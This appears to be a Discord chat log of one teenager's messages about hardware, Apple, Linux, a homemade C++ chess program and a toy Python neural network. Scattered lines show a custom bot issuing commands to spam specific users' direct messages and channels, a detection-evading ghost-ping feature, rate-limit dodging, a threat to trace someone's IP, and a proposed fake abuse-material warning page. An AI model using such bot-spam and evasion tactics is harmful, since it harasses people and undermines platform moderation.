Are you also grinding Microsoft Rewards?


In my opinion it's better than Notepad++.


The text editor.


It just opened in Kate.


Downloaded it and ran it.


Ah, that's why it sounds bad.


Did you just skipped to the end?


I bet you haven't listened to it yet and just made an assumption but okay.


<@672892838995820553> <@816692546272100442> How's this music?
https://www.youtube.com/watch?v=gA03iyI3yEA


They also announced a lot more AI technologies.


Must be bots.


By the way, <@672892838995820553>, NVIDIA made an AI software that can live translate **both your voice and lips** to a different language.


So, I can tell that you are not interested.


That's what people say when they're not interested.


It's an NVIDIA-hosted event about advancements in AI technology and stuff.


By the way, did you watch GTC 2022?


How is your day?


For those of you who prefer a summary more professional than Huang's live blog.
https://www.youtube.com/watch?v=SLqx8m6KOxg


It doesn't break mine though.


It is the Linux Penguin.


I don't have a bus.


Good morning, server.


Look it up on GMail.


Wanna stream it in VC?


Though Ethereum is moving to proof of stake, so...


Yeah, get your friend with the crypto-card to help you.


CPU mining is not efficient.


But I'm guessing around 5 dollars a month or something like that.


That's a rough estimate.


But it will be working at 1% the minium wage of Bangladesh.


It won't blow up.


Just add CPUs.


Get NiceHash and start mining bitcoins.


It's as expensive as the PC you're going to get alongside this.


AMD keeps changing GPU branding schemes for some reasons.


Before that, the Vega 56 and Vega 64.


And before that, there's RX 500 and 400.


There's RX 5000 and RX 6000.


GPUs are both even and odd.


The generation before 5000 was 3000.


Also, Ryzen 7000 is going to support DDR5, so you don't have to use DDR4.


AMD literally just announced Ryzen 7000.


You like messing with hardware?


And CUDA (or Vulkan Compute on AMD).


And also, using OpenGL.


That could work.


Apple gives really good keynotes.


Like, what kind of stuff?


July is fall?


Also, <@816692546272100442>, hello.


Yeah, it's just parts of a hard drive that's being used like RAM.


You think they're gonna let you expand storage?


Also, this is Apple.


You don't know what swap is?


He still doesn't insert periods though.


What do you mean?


Less than 1 year ago, actually.


It ended only 1 year ago.


Last time I checked they got sued by Epic for antitrust violations.


Mainly for the closed nature of their ecosystem?


Yes he's another Apple fanboy.


Jay is very anti-Apple.


Also, wait until Jay comes back online to this.


Though with enough efforts you can make a program that runs on both Apple and non-Apple.


You're either developing for the Apple ecosystem or you're developing for everything outside the Apple ecosystem. It's hard to develop for both nowadays.


They're not supporting any open-standards though.


But you can write Swift programs on iPads now, I guess you could use that as a calculator.


Weather's not on iPad?


Looks like that's it.


<@628672513345454122> Any more updates?


Phones are not good.


I don't have a phone.


You're not making any sense.


Then why did you say you do?


I know this is kind of kind of old, but...


Got anything to say?


It's going to use traditional upscaling techniques.


It appears that MetalFX does not use AI.


Since FSR is still using traditional upscaling.


If it uses dedicated neural engines it's going to destroy FSR.


What's the text above?


They said they're going to use traditional upscaling algorithms though.


So, they're not even going to use Neural Engines to do upscaling?


Microsoft DirectStorage is already been released for a full year now.


THEY AREN'T EVEN GOING TO LEVERAGE THE NEURAL ENGINES???


Hopefully it's more like DLSS rather than Fidelity FX Super Resolution.


Okay, let's hear what they're going to say.


And the partnership contract required prevents you from reselling those cards.


You have to be an NVIDIA business partner for you to buy them.


Technically, individuals can't even purchase Tesla cards.


Serious or sarcasm?


And they work best when you have hundreds of them.


They cost as much as a Tesla car, so...


Ever heard of NVIDIA Tesla?


No, a Tesla is an actual graphics card brand.


Seen the price of the H100?


Not as expensive as Tesla.


How about an RTX A6000 with a ThreadRipper 3990X?


Because you don't like Mac desktops?


I'm using Kubuntu 20.04.4 LTS.


I'm not using Macs.


It's how I search up how to fix desktop crashes.


You can use it even if your desktop somehow crashes.


Here's a screenshot.


Lynx is so far away from chromium, it's like comparing cats and bats.


Why don't you use Lynx instead?


Safari-exclusive websites are now coming.


Safari didn't support HTML5?


<@672892838995820553> Is it just me, or are we stealing activity from G9DE?


Probably because you don't have 2 GPUs.


Also, by the way, <@628672513345454122> you got Linux, right?


Ah, I see.


They were using names of furries?


Fortunately, I do not use CIBC for anything.


Unless you can replicate the issue with another Intel GPU, I doubt it's Intel.


Intel has literally some of the best driver supports out there.


This is the only instance of the word "homophobic" on this server.


Is Mazin gay, by the way?


That what I want.


You said that he was talking to himself, so I'm just correcting you by saying that he's actually just logging a summary.


No, he's logging a summary of the Apple event.


Oh yeah the CPU and GPU architecture is designed so that it barely emits any heat, making fans basically unneeded.


M2 MacBook Airs have fans?


I am very concerned about the cooling though, since MacBook Airs typically lacks fans.


Laptops of that performance and portability usually costs more than that.


Well, looks like you're getting an M2 MacBook Air?


MacBook Air is back?


Not sure if dedicated video encoding/decoding are really neccesary.


They didn't specify the GPU however.


Same reason I turned off my typing indicator.


Wait, doesn't the single M1 Max have support for up to 64 GB?


Ah, I see.


Also, doesn't the M1 Ultra have 128 GB?


LPDDR5, not DDR5, bozo.


On an iPhone?


And it means that most of the software written in the next few years probably won't work either.


Which means that you can't select text from images.


So, basically, the entire developed Anglosphere?


Bet you that your PC doesn't have neural engines.


Usually, if I have the money to pay for something, I avoid paying it over time.


Isn't that powered by M1 now?


Though NVIDIA's Tensor Cores still outperforms them.


In the M1.


That's pretty cool.


Live Text for live text messaging?


No, I do not.


What are the 4 new APIs?


Now that I think about it, I probably shouldn't have used Blue as the color.


Also, <@690265771955585029>, how is your country?


It is the headquarter of the organization responsible for the creation, editing, and distribution of Pooper Times issues.


Welcome to the Li Institution Headquarter's Lobby.


"anecdotal evidence" 💀


Anthony tried to add it to lobby so I thought...


<@672892838995820553> What the hell is wrong with this bot?


No, you're not.


Yes, you are real.


I don't know.


What robot life?


You only need `EMBED LINKS` to advertise, bozo.


CB add <#978304385895522324>


Can't right now.


I am now.


Ah, I see.


So, how far *can* you go without pro?


So, no progress yet?


Anyways, how's your JavaScript course going?


Different people have different opinions.


Oh yeah, I think that's the one I'm using.


By the way, <@672892838995820553>, try to see if you can understand the math in this video. I'm pretty sure that you can since you had a much higher level of math education than I did and I managed to understand a lot of it.

☝️ Anthony's profile picture.


Good morning, Mazin.


Also, just removed the server links channel since it doesn't have any purpose.


If you JIT compile it though it can run almost as fast as Assembly.


Which does not have the problem of memory leaks.


C++ have smart pointers.


Never experienced one since I don't use raw pointers.


<@628672513345454122> Yeah, regular, non-spam ghost ping still exists.


I think that regular ghost ping is still there though.


I've disabled the spam ghost ping to prevent the Administration from banning my bot.

He's got higher rank so he overrides you.


And Raku doesn't have manage message perms.


All of them?


Though you probably have a lot of messages to delete.


<@672892838995820553> You should try it yourself.


Makes stuff look funny by taking them out of context.


How do you learn programming?


It's so fast that it rivals C++ in terms of performance.


PyPy is insanely fast.


Clang is a C++ compiler that seems to be supported by Apple that you can also use on Linux since it's open-sourced.


It's mainly APIs and libraries.


There are no languages (that I know of) that doesn't work on macOS.


It just showed an upside-down pawn on a chessboard.


C++ works on macs, but OpenGL not so well.


Apple deprecated it anyways so I was kind of expecting a lot of bugs in the OpenGL driver on macOS.


Well, C++ works.


Apple is constantly releasing updates to break attempts at running macOS on VMs or any non-Apple devices.


Same, but it no longer works.


Mainly because you use cross-platform languages.


I'll probably have to buy a Mac to get them working since Apple doesn't allow cross-compiliation or running macOS in a VM.


However, none of my programs have worked on Apple platforms.


Easier to use.


But most developers do.


Consumers don't care.


That what I mean by "hard to get into".


Metal's only available on Swift and Objective-C, by the way.


Everything you do requires Apple's proprietary APIs that are only available on Apple's proprietary programming languages.


It's so hard to get into the Apple ecosystem.


Hey, Microsoft never supported Metal on any of their platforms either.


They outright decided not to support Vulkan at all.


They stopped using Intel CPUs and started making their own. 😹


!translate Apple deprecates OpenGL 😾


Okay, the turns thing seems to work as well.


Now to implement turns.


Okay, the board flipping now works.


lol translate I like to eat myself but they're always keeping watch.

lol translate  When I was quite small I would sometimes dream of a city--which was strange because it began before I even knew what a city was. But this city, clustered on the curve of a big blue bay, would come into my mind. I could see the streets, and the buildings that lined them, the waterfront, even boats in the harbour; yet, waking, I had never seen the sea, or a boat....

And the buildings were quite unlike any I knew. The traffic in the streets was strange, carts running with no horses to pull them; and sometimes there were things in the sky, shiny fish-shaped things that certainly were not birds.

Most often I would see this wonderful place by daylight, but occasionally it was by night when the lights lay like strings of glow-worms along the shore, and a few of them seemed to be sparks drifting on the water, or in the air.

It was a beautiful, fascinating place, and once, when I was still young enough to know no better, I asked my eldest sister, Mary, where this lovely city could be.

Dreams were funny things, and there was no accounting for them; so it might be that what I was seeing was a bit of the world as it had been once upon a time--the wonderful world that the Old People had lived in; as it had been before God sent Tribulation.

But after that she went on to warn me very seriously not to mention it to anyone else; other people, as far as she knew, did not have such pictures in their heads, either sleeping or waking, so it would be unwise to mention them.

No but it deletes so fast that they can't even see the message.


I might make it try to.


Should I make spam ghost ping?


It deletes so fast you can't even see it.

I'm gonna ghost ping Shiva.


I should create command to ghost ping everyone in server.


Creative Commons Attribution ShareAlike is for ideas.


MIT's for code.


You can implement it under the condition that you credit me and allow other people to steal it.


I shall license that idea under the Creative Commons Attribution ShareAlike 4.0 License.


I should make a ghost-ping command in rai rai raku raku.


When winter comes, use your PC outside.


Bad cooling design, seems like it.


Slow hardware-accelerated decoding due to bad graphics card?


Maybe that's your internet, not your computer.


So, if Minecraft is laggy, it's probably because of the CPU, not GPU.


And it barely does any work on the GPU side.


Minecraft is badly optimized on the CPU side.


I'm guessing you'll get 0.1 FPS on Halo Infinite lowest settings possible.


Then, when I started playing at 60 FPS, 30 FPS suddenly started feeling very laggy.


Oh yeah, I remember how I used to play at 30 FPS with a bad computer and not notice.


30 FPS feels smooth to you?


Run it at 1280x720?


Then how did you run it at 60 FPS?


One day, the PC Master Race shall grant you all TITAN-class workstations.


And I did it again.


I don't remember flexing my GTX 1660 SUPER that can run Minecraft at 4K 200 FPS.


So, that could make it look rather strange.


And also, the Tony emoji has an awkward aspect ratio.


Not an emoji.


Because it's an image.


He's another person who knows C++.


You have performed your first obfuscation!


So, after forcing it to run in windowed mode, it just created a flashing color screen with text that says "FUCK YOUR EYES".


And also the fact that I'm using NVIDIA video drivers (which does not work well with KDE) and a 4K monitor with scaling (which does not work well with NVIDIA or KDE, or X11 in general).


KDE doesn't really work well with fullscreen apps, so I guess that's expected.


It just caused my desktop to glitch due the fullscreen not implemented correctly, I think.


I might recreate this in OpenGL.


Or tried to develop a game right on top of the graphics driver.


Sounds like you've never gotten into engine dev.


Not interested in game development?


Are you even planning to use it again?


When are you going to use it again?


By the way, <@672892838995820553>, remember Godot?


Calculus, I think.


I just use whatever language is the best fit for whatever I wanted to achieve.


Also, by the way, I don't have a favourite programming language.


Which is why it's not recommended.


Because different CPU architectures uses different assemblies.


However, you'll have to completely rewrite your program for every CPU in existence.


Not only can it, it excells at it.


Python can though.


Python's interpreter is written in C, Lua's written in C, Java Virtual Machine is written in C++, etc.


Also, C/C++ forms the foundation of most other programming languages.


<@628672513345454122> This is full stack as far as my understanding goes.


Okay, here's the breakdown so far:
- Frontend: JavaScript, Python, C++, C
- Middle-end: Python, C++, C, PHP, Java, C#
- Back-end: C++, C, Assembly (not recommended)
- Driver: C, Assembly


Though C# is also pretty privalent in middle-end development.


You'll eventually understand what all of that means.


None of those are easier than C++ from what I know.


The only other back-end languages I know would be C and Assembly and *maybe* FORTRAN.


Java isn't that hard to use and is more powerful than PHP.


You might as well just learn how to make Java Servlets.


That did not happen to me nor the Placeholder guy, for some reasons.


And you're gonna use C++ for back-end programming?


<@672892838995820553> TypeScript was created to address those issues, and it does so pretty well, which is why I prefer TypeScript over JavaScript.


Back-end programming has been completely taken over by C++ and Java.


Okay, I do not know much about debating, so I'm just gonna let <@672892838995820553> and <@628672513345454122> take over from here.


(However, I'm not supposed to interfere with this debate so silently ignore this...)


Nope! Python's also primarily used for frontend programming.


Mainly in other servers.


Due to his behaviour in other servers and this one.


No matter how long that's going to take.


It's going to wait until he replies.


Let's start with you, <@672892838995820553>. Give us your opening statement.


Okay, <@628672513345454122> has chose to rejoin the debate. The debate shall continue.


Well, look at that! <@628672513345454122> has chose to bail out! <@672892838995820553> is victorious! Stay tuned for another episode of Raku Debate!


Welcome, everyone, to another day of Raku Debate! Today, the topic is: Which is better, Python or JavaScript?

On one side is <@672892838995820553>, who supports Python. He is the developer of Can Pooper and other projects, all of which is written in Python. He really likes Python but hates JavaScript, despite having used JavaScript in the past to make stuff such as his GitHub Pages website and *Can Pooper Except In JavaScript*. As you can tell, this man is on one side of the spectrum.

On the other side of the spectrum is <@628672513345454122>, a rather experienced web developer who swears by JavaScript and uses it in almost every one of his projects, whether it be FHDBot or anthonyhuang07.github.io. He has used JavaScript ever since he started programming and loves the language. However, he does not hate Python.

So, anyways, let's start with the opening statements. We'll start with you, <@672892838995820553>. Give us your opening statement to make sure we understand what exactly are your viewpoints.


It was a NATO member.


Yeah, it's never communist.


The Neatherland was never communist if I remember correctly.


No he's not.


After several long hours of discussion, the Li Institution Executive Council has decided to lock out null.


Which is better: Python or JavaScript?


<@845361227093508116> I want you to settle a debate that's been going on for a while now between Anthony "Jiayan" Huang and Neng Li.


You're a *de jure* employee.


What's preventing you from inviting people?


You're all just guests hanging out in the lobby.


None of you are employees.


Okay, the video is not available so...


<@628672513345454122> By the way, wanna join VC for music?


This prevents rate-limiting.


No, because I added a 1.5 second delay between each nickname change.


How about something more interesting.


Try to figure it out.


You know what it is?


Watch your name closely.


<@845361227093508116> You there?


<@628672513345454122> Watch Mazin's name.


Okay, should be working now.


At least not properly.


Wait, it's not working.


<@628672513345454122> Yo, watch this.


What other neural network training algorithms do you know?


But I don't know any other methods so...


It's the slowest method though.


And use that as the base weights.


Then, you create lots of variations of that network.


You start with a neural network with random weights.


It's exactly what it sounds like.


But the simplest method is through *natural selection*.


There's a lot of ways to do that.


And then we simply train the neural network to behave the way we want with these inputs and outputs.


And the output layer could just be four numbers representing the position of the piece it wants to move and the position it wants to move it to.


The input layer could simply be an array of numbers representing the pieces in each position.


Ah, that's simple.


You mean *implement* it or do you mean you have no use for it?


So, basically, the value of a neuron is basically just the sum of the weights of all the connections to that neuron times the value of the neurons that those connections leads to.


Or do you already?


By the way, you wanna know how neural networks works?


He's getting it for his political agenda, I think.


The USSR didn't even exist when the Industrial Revolution happened bozo.


What's the question?


I thought that you said that you're happy you're not born in China because you won't get a Xi Jinping citizenship.


No, it's a simple neural network with random training data.


<@672892838995820553> Here's the neural network.
```python
import random

def matrix_times_vector(matrix, vector):
    result = []
    for i in range(0, len(matrix)):
        element_result = 0
        for j in range(0, len(matrix[i])):
            element_result += matrix[i][j] * vector[j]
        result.append(element_result)
    return result

# im too lazy to add layers manually rn so im just gonna randomly generate
def generate_random_connection_layer():
    result = []
    for i in range(0, 6):
        row = []
        for j in range(0, 6):
            row.append(random.randint(-20, 20))
        result.append(row)
    return result

input_layer = [ 6, 9, 14, 9, 19, 13 ]
connection_layer_1 = generate_random_connection_layer()
neuron_layer_1 = matrix_times_vector(connection_layer_1, input_layer)

connection_layer_2 = generate_random_connection_layer()
neuron_layer_2 = matrix_times_vector(connection_layer_2, neuron_layer_1)

connection_layer_3 = generate_random_connection_layer()
output_layer = matrix_times_vector(connection_layer_3, neuron_layer_2)

print("Neuron Network Output:")
print(output_layer)
```


So, I'll just do it the old way.


Actually, I can't find any good Python matrix libraries.


Okay, I might use a Python matrix library since I'm **NOT** implementing matrix multiplications again.


I think I might write a three-layered neural network to show you what I mean.


It's even easier.


Also, implementing neural networks is so easy that even you could do it.


That I know of, of course.


The only open-sourced chess bot would be StockFish.


Though the neural network approach is probably much easier than tradition top-bottom algorithms.


You don't need neural networks unless you're planning to make one of the most advanced chess bots in the world.


That's why I'm adding the Python API.


But maybe you can help write the bots.


I'm planning to add support for multiple bots.


And so that I don't have to write the bot myself.


So that you can switch bots.


But I'm probably gonna use a Python API for the chess bot.


Maybe I can just create a Python API and let you do the work for me 😹


But to implement it mathematically is kind of difficult.


It's not complicated for humans.


So, to check if castling is legal, I'll have to.
a) Check if the King has moved at all or not.
b) Check if the Rook has moved at all or not.
c) Check if the squares between the King and Rook are legal moves for any of the enemy pieces
d) Check if all the pieces between the King and Rook are invisible


There's also checking, which is simpler.


So, to check if castling is legal, I'll have to.
a) Check if the King has moved at all or not.
b) Check if the squares between the King and Rook are legal moves for any of the enemy pieces


Very complicated logic.


Wait, so if I moved my king but later moved it back, can I castle?


What bot program?


So, I'll need to implement those.


But it doesn't account for special behaviours such as castling, en passe capturing, or checking.


I already have a function that checks if a move is legal or not.


<@628672513345454122> By the way, the pawn now works, but I'm too lazy to push out an update just for this.


We don't care about activity at all.


It is a communication portal.


This server is not a community.


We do not keep track of activity on this server.


I switched back to Kubuntu since most of my stuff are on here.


(In terms of months and days, that is).


Very close to the American birthdate.


So you're 11?


Are you older or younger than Mazin?


Visual Studio C++ compiler just reported that my code has 543 warnings.


Blank spaces are invisible white pawns by default, so you can still capture black pieces with blank spaces.


Also, I just noticed I haven't fixed the problem of dragging blank spaces.


Well, time to fix it.


Ah, I see.


The pawn can still do anything it wants?


And you can only move in certain configurations.


You also can't jump over pieces unless you're a knight.


Try running it.


Anyways, <@628672513345454122>, have you downloaded the update?


In fact, I don't think that's even possible.


Since most system APIs do not let you do anything to physically damage hardware remotely.


That would probably require some level of Assembly language.


You'll need to use something like CUDA or Vulkan Compute.


Doxxing can't be done by a program in C++.


Though feel free to get into data science if you would like to find out.


There's more jobs available for C++ than Mandarin.


Learn C++ instead.


<@628672513345454122> NEW CHESS PROGRAM RELEASE.


Also, bruh, why is there so much guests in the lobby?


It allows you to run GPGPU compute kernels on NVIDIA GPUs from Maxwell and up.


Learn CUDA first.


Even the great genius Neng gave up after a while.


You should try learning that.


Not as hard as C++20 though.


It so hard that if you don't use it for too long, you start to forget.


What is it?


He's in this Protagonist-Antagonist situation.


Is that why you hate Tony?


My dad's from Manchuria, while my mom is from Guangxi.


My family is also pretty spread apart.


Okay, bruh, java.com still offers the download for Java 8.


Seems like java.com is being abandoned or something.


Oracle's website was updated long before java.com was updated.


So, tell me if this works.


<@672892838995820553> Anyways, gonna go now.


<@672892838995820553> Does it work?


Yuan is a unit used to measure RMB.


I assumed that it was either Neng or Mazin.


What was your brother?


But he messed up and revealed himself.


I'm telling it to you because he's claiming to be Xi Jinping.


<@628672513345454122> By the way, <@710992609404780567>'s Neng Li's alt.


It's still spamming your DM?


<@628672513345454122> I assume that you muted the bot.


$$$start_spamming_dm$$$ 628672513345454122 r u anthony huang


$$$start_spamming_dm$$$ 650439182204010496 something bad


It's spamming <@710992609404780567>'s DM.


Interesting how he changed it when you said that.


No, "you", didn't.


No it doesn't.


You can literally do much better than this.


<@672892838995820553> This is not very convincing.


And I can literally see that Neng and him can't talk at the same time 💀


I can literally see the status transferring between the two accounts.


Bro, he's switching between accounts.


And then he turned off activity monitor or something.


Neng was playing Photoshop.


THEY'RE BOTH PLAYING PHOTOSHOP!!


IT'S NENG'S ALT!


I KNEW IT!


I'm gonna trace this guy's IP.


You're Mazin's alt 💀


Are you eliminating every way for me to verify your claims?


Also, since I'm an executive, I should get some of the money.


If they do purchase us, I would like to see the check.


Not joking around.


Like, not roleplaying.


Are you saying that the CCP will actually purchase the Li Institution?


We're not joking about this right now.


Like, really buy us?


Which I seriously doubt they will.


They'll have to actually buy us.


We still operate independent of the state.


But we're not actually state-owned.


That sounds very hypocritical since the Li Institution is technically a private institution built on the foundations of capitalism.


Okay, maybe I should make a role for de jure employees.


He's a de jure employee.


You're CEO, after all.


It shows something else.


YEE, it works!


But still, you can mute the bot if that were to happen.


You can remotely start spams.


Also, since it doesn't have Admin, you can now mute it if a spam were to somehow get out of control.


I can't even start a spam since I'm not in the server.


<@672892838995820553> By the way, if you want, feel free to add Raku back to G9DE (with limited permissions, of course), feel free to do so.
https://discord.com/api/oauth2/authorize?client_id=725811783012450306&permissions=275079350336&scope=bot


Anyways, I added the default spam message back.


So, since the official American football rules never said that using a horse isn't allowed, then you're allowed to use a horse in a football game?


Ah, I see.


So better be safe than sorry.


Though it doesn't say that it's allowed either.


It doesn't say that it's not allowed.


Is mentioning CP against GitHub's TOS?


Though some people might misreport it and things would get complicated.


I don't think that it's against GitHub's TOS to make people freak out by making them think that they're trying to access CP.


Since CP is a more serious crime.


Also, you should make the warning page about CP rather than Pirating.


It seems to work.


By the way, I tested it on mobile.


I can't do it because I'm not in the server.


By the way, you forgot to record activity data for May 28th.


<@672892838995820553> Look! The classic Raku command is back!


$$$start_spamming$$$ L BOZO RATIO


That's pretty nicely made.


Probably last year or something.


I created mine a little while ago.


Okay, changed the name now.


It recorded the title when I visited your Sheet and the name got stuck for some reasons.


It's free on Steam.


You should play it.


The game it talks about is more scary than the thumbnail.


Hold on, watching Youtube right now.


Though it's good to have multiple copies.


Or we can store them on scp-studios.github.io/li-institution/pooper-times


<@672892838995820553> We should create an archive of Pooper Times news articles.


Also, the person who actually said the quote was Neng.


That's a reference to when the Onion declared Kim Jong Un the sexiest man alive.


From now on we will not slander you in the Pooper Times.


Is it because of the quote or one of the articles?


By the way, `discord.py` has a Rich Presence API, I think.


<@672892838995820553> Is it still stuck now?


It's clocking on my side.


What the fuck?


<@672892838995820553> Now what?


Now, gonna try running it again.


Because I turned it off.


It's not on my side.


<@672892838995820553> By the way, is it still stuck at 0:00?

Sure, why not.


Wait until Anthony Huang sees this.


<@672892838995820553> How's this?


The Li Institution logo?


What do you want me to set as the icon?


Is this for your debate class?


Unless you go through it carefully to eliminate any bias.


Is it biased?


Also, it's more of a game framework than an engine.


If Geometry Dash was open sourced, it wouldn't cost any money on Steam.


The Engine is open sourced.


But they're used for build automation and code parsing rather than as part of the final product.


The repository does indeed contain some Python.


And then I just go to the Rich Presence tab.


<@672892838995820553> I literally just found out that to register your game, you just create an application like normal.


<@672892838995820553> Are you having Python do your work for you?


<@628672513345454122> Wanna watch me stream?


<@672892838995820553> By the way, wanna watch me stream it?


Bro, the anti-aliasing is so bad.


It costed money, but I got it for %100 off.


It's a sandbox game.


It's a game about a future in which everyone's old because nobody's having any kids.


I have no idea why you think that.


To make it clear, me and Tony are **NOT** enemies.


You're on your Apple watch again, right?


How about you?


<@672892838995820553> Am back.


Okay hold on gotta go eat dinner.


I can give it to you if you would like.


It's directly below skynet.


It create a role called "Sub-Skynet".


I did that with my bot.


Since we're in control of those two bots, we are the owner.


Since they have the highest role other than the Owner itself.


You could say that it's owned by Can Pooper and Rai Rai Raku Raku.


He just forgot both the password and the email.


It's one of his alts.


He said that he can't even log into the account.


I added some chess rules in my chess program.


1. You need to be in the Can Pooper team.
2. You need to specify a channel.


Who the fuck is deleting the messages?


This is a communication hub, not a regular-old Discord server demanding activity.


This one looks a little better.


Probably just collect data about your server.


And that's slow, right?


Oh, I see.


Is there a keyboard or something?


Ah, I see.


On my way.


Nothing much, how about you?


So, those are the only things that you can do?


<@672892838995820553> Check this out.


How about you?


At least real-world politics are.


Politics are gone for today.


I'm going to have to try and write an ideology around that.


But given the current context, it's pretty clear that Jaydism is more or less against Communism.


We haven't defined it yet. 😹


See you later.


Anyways, open the LiveShare.


We should have a single message and simply edit it to update the list.


Also, isn't Nengipedia a property of the Li Institution?


Yeah sure. I'll just edit Nengipedia while I wait.


Anyways, should we start writing the Pooper Times now?


Anthony can defeat a cheater. 😹


Anyways, gonna go have dinner now.


Even with a Python script to cheat!


Did you download any at all?


I downloaded a lot of plugins on BetterDiscord.


Imagine downloading all the plugins on BetterDiscord.


No I can't apparently.


Wait, can I upload SVG files as emojis?


You can design SVG files using a program like Inkscape though.


They're SVG files.


Bruh, my latency suddenly got so bad for some reasons.


Ayo, that's cheating.


Like, Discord animations?


Wanna see my new animations?


I got better animations.


You accidentally removed my member role?


I got locked out.


<@672892838995820553> Bruh, what happened?


!convert 1 Jayd


Ah, I see.


Value of the Jayd dollars skyrocketed.


Does that not require a Pro Account?


Then how did you use the API?


So, did you sign up for a DeepL pro account?


You're sending too many requests bozo.


Here is all of our territory that we might get.


In fact, pilot schools actually use FlightGear to teach students how to operate an aircraft.


Though Flightgear requires legitimate pilot skills to fly since it's so realistic.


Not as fun as Flightgear though.


Google Earth Pro looks better and is faster on Linux than on Windows!


It costs money?


Then why is there only one contributor?


It's an unofficial binding.


Depending on his successor, of course.


They draw some hot air out of the case through the top.


Including re-adding the ten-year-long presidential term limit.


And faster USB.


Though they might change a lot of things after Xi's death.


But he didn't make a compelling argument, so...


When Xi Jinping dies.


Anthony thinks that it will happen in 13 years.


<@672892838995820553> By the way, when do you think the CPC will collapse/loose power in China?


Does that mean the CCP will collapse?


Can you provide a valid reason?


Because death of an unpopular leader doesn't mean the downfall of the government.


So, does that mean the CCP will collapse when he die?


Why do you think the CCP will collapse when Xi Jinping dies?


Are you being serious or just fooling around?


Why do you think that?


Xi Jinping's death will mark the end of the CCP?


<@628672513345454122> Question: When do you think the CCP will collapse?


He's probably just using the search functionality to count messages now.


<@672892838995820553> Forgot to reset bozo.


I'm using a 4K display.


Like, when I type `:tony:`, it just does this.


<@672892838995820553> Apparently, what the free emoji plugins does is it just converts external emojis into image links.


By the way, this is what my Discord currently looks like.


lol send_news 967091628177252423


Show me what it looks like so far?


Hold on let me try restarting.


I expect it to send the Tony emoji.


Ayo, better discord doesn't work.


Since the United States still exists.


It's suppose to take place during the present.


But this is satirical so I guess it's okay.


AMD didn't exist for 173 years.


It increases response time, so...


Not sure what that is.


If they look the same just leave it at default.


Choose the one that looks best.


I avoid using that.


So you can take parts of its code for your own use.


VS Code is technically open sourced.


I just found out that the code editor in BitBurner came from VS Code.


What will you use the second monitor for though?


And cheap ones have really bad refresh rate and color quality.


Though Ultrawide panels tends to be expensive.


Something like the Odyssey Neo G9.


Maybe you can get Ultrawide.


But I have the other one shutted off.


I have two monitors.


I doubt that you'll ever need two monitors.


<@628672513345454122> By the way, have you looked into buying an RTX A6000?


GPU still 5 times better than your current GPU.


I think you did.


Unfortunately, the images are too low resolution for me to see.


So you'll have to look really closely.


The labels are quite small though.


You look at the motherboard and count the number of plugs labeled "case fan" or something similar.


Depending on the amount of fan slots on the motherboard.


The allow you to plug in more fans into the motherboard.


So probably Samsung.


No idea what "wd" is.


Though if you get more fans you can get bottom fans installed as well.


I didn't see many cases that supported it.


You can install fans at the top as well?


Or did u just have it open?


<@672892838995820553> BTW, r u actually playing Mc?


Haven't played it yet though.


<@672892838995820553> Give invite link to G9DE.


<@672892838995820553> Can I get an invite link to G9DE?


Hopefully your parents weren't around when you opened it.


I was wondering what a game called "super idol" is.


Did you edit that or is it censored by default?


You'll have to enable 18+ content, I think.


There's a game just called "Super Idol".


<@628672513345454122> I dare you to search up "super idol" on Steam.


That you said in VC.


It's your transliteration of "Li Institution".


li ying shi tu shen


<@672892838995820553> Wanna rejoin Anthony's Server?


The things connecting are all the ports combined together.


Think of them as highway lanes.


Different parts of network channel.


Which is why you can use it for Can Pooper.


420 is unclaimed.


Whoever claims them first.


Port 443 is HTTPS.


Port 80 is HTTP.


There's only one SSH port, and that's Port 22.


It officially supports Linux.


My Windows partition is full so I'll have to install on Linux.


The name "Mac" is Vietnamese.


You can ask him to play Minecraft if you want.


So, not sure.


But has a Windows PC.


He uses an iPhone.


The one from Calgary.


<@672892838995820553> I rejoined Anthony's server.


The queen looks like a handle-less broom.


Also, the knight doesn't really look like a horse.


Try dragging the pieces.


Here you go.


<@628672513345454122> The packaging process is done.


Okay, now that I've compiled it with Visual Studio, I have to package the executable.


Most of my games are on Windows.


It's the other way around.


Now to compile it.


Okay, I'm in Windows now.


Which means I need to restart into Windows.


Hold on while I create Windows binaries.


Wanna see the chess program?


Does dragging work?


Be right back.


He's trying out my chess program.


It's for Neng.


Just be patient.


It's taking a to compile some stuff.


Okay, try running this command:
```bash
cmake . -D CMAKE_BUILD_TYPE=Release
cmake --build .
./chess.out
```


All I know is that dragging is not working correctly in my chess program.


<@672892838995820553> I'm super spamming the dead server.
